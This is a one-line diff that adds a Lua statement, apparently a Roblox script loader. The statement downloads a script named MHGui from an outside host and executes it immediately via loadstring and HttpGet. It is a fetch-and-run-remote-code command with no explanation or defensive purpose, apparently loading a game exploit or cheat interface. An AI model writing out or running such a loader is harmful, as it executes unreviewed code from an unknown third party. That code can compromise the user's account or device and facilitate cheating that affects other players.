@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://polarix.xyz/releases/MHGui.txt",true))()
